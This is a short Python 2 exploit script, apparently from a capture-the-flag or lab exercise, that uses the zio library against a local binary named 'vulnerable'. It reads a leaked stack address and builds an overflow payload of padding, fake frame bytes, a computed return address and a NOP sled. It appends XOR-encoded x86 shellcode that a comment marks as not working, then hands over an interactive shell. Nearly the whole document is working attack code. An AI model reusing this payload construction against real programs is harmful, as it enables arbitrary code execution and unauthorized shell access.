#!/usr/bin/env python
# coding:utf-8

from zio import *
import binascii

# objdump -d shellcode (not working)
shellcode = "\xeb\x14\x5e\xb9\x15\x00\x00\x00\x8b\x06\x35\xe9\x00\x00\x00\x89\x06\x46\xe2\xf4\xeb\x05\xe8\xe7\xff\xff\xff\xd8\x20\xb8\x81\xc6\xc6\x9a\x81\x81\xc6\x8b\x80\x87\x60\x0a\x83\xe2\xb1\x70\x24\x69"

print "=" * 16
print "[SHELLCODE] : %s" % (binascii.b2a_hex(shellcode))
print "[LENGTH] : %d" % (len(shellcode))
print "=" * 16

Io = zio("./vulnerable")

# python -c 'print "A" * 8 + "BBBBCCCCDDDD" + "@@@@"' | ./vulnerable
junk = "A" * 8
fake = "BBBBCCCCDDDD"
nop = "\x90" * 16

address = l32(int(Io.readline()[2:10], 16) + len(junk) + len(fake) + 8)
payload = junk + fake + address + nop + shellcode

Io.write(payload)
print ""
print "=" * 16
Io.interact()
